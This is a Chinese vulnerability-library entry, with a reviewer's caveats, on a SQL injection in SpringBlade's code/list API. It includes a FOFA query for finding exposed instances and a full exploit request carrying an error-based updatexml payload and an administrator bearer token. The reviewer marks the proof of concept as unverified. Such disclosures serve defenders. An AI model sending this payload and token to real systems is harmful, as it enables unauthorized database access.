---
source: "wy876 漏洞文库"
product: "SpringBlade/blade-develop/code/list"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SpringBladecode-list存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：仅产品名，无版本/修复范围；提供管理员声明JWT，但没有说明有效登录或硬编码密钥伪造前提"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-1ba4d2e1150c16889d58d092"
entity_id: "ve-1ba4d2e1150c16889d58d092"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅产品名，无版本/修复范围；提供管理员声明JWT，但没有说明有效登录或硬编码密钥伪造前提

代码与实验材料：单GET参数名updatexml(user())，没有错误响应或代码

来源证据范围：转载/语雀来源可追溯，未给对应官方修复提交或完整权限模型

- **适用与权限边界（1）**：未验证注入与权限条件；依据：管理员Bearer请求本身不能证明任意用户可达，需查询构建和错误证据。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：格式不规范；依据：Host空、HTTP标java，FOFA包在font标签内。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# SpringBlade code-list存在SQL注入漏洞

# 一、漏洞简介
SpringBlade code-list存在SQL注入漏洞，攻击者利用该漏洞进行SQL注入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`


# 四、漏洞复现
```java
GET /api/blade-develop/code/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rai84tybgfc4flks>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
